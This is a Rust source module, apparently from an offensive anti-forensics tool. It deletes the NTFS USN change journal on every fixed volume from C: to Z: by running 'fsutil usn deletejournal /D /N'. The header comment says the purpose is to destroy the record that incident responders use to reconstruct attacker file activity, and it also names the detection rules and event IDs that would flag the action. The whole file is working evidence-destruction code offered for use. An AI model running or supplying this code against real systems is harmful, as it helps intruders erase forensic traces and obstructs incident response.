// NTFS forensic artifact cleanup: $UsnJrnl (USN Change Journal).
//
// $UsnJrnl:$J records every file system operation (create, delete, rename, modify)
// with FILETIME precision. IR teams use MFTECmd to reconstruct attacker file activity
// even after event logs and other artifacts are wiped. It is one of the first artifacts
// collected in Windows IR.
//
// This module runs `fsutil usn deletejournal /D /N <vol>` on all accessible fixed volumes.
//
// Detection: Elastic rule 'defense_evasion_delete_volume_usn_journal_with_fsutil',
// Sysmon EID 1 on fsutil.exe, EventID 3079 in Application log (from NTFS driver).

use std::path::Path;
use std::process::Command;

#[derive(Default)]
pub struct NtfsStats {
    pub journals_deleted: u32,
    pub volumes_found: u32,
    pub errors: u32,
}

pub fn wipe_usn_journal(verbose: bool) -> NtfsStats {
    let mut s = NtfsStats::default();

    for letter in b'C'..=b'Z' {
        let vol = format!("{}:", char::from(letter));
        let root = format!("{}\\", vol);
        if !Path::new(&root).exists() {
            continue;
        }
        s.volumes_found += 1;

        // fsutil usn deletejournal /D /N <vol>
        //   /D = delete the USN journal
        //   /N = no-wait (do not wait for offline transition of the volume)
        let result = Command::new("fsutil")
            .args(["usn", "deletejournal", "/D", "/N", &vol])
            .output();

        match result {
            Ok(out) if out.status.success() => {
                s.journals_deleted += 1;
                if verbose {
                    eprintln!("[+] ntfs: $UsnJrnl deleted on {}", vol);
                }
            }
            Ok(out) => {
                let stderr = String::from_utf8_lossy(&out.stderr);
                let stdout = String::from_utf8_lossy(&out.stdout);
                let msg = if !stderr.is_empty() {
                    &*stderr
                } else {
                    &*stdout
                };
                if verbose {
                    eprintln!("[!] ntfs: USN delete on {}: {}", vol, msg.trim());
                }
                s.errors += 1;
            }
            Err(e) => {
                if verbose {
                    eprintln!("[!] ntfs: fsutil exec on {}: {}", vol, e);
                }
                s.errors += 1;
            }
        }
    }

    if verbose {
        eprintln!(
            "[+] ntfs: {} volume(s) scanned, {} journal(s) deleted, {} errors",
            s.volumes_found, s.journals_deleted, s.errors
        );
    }
    s
}
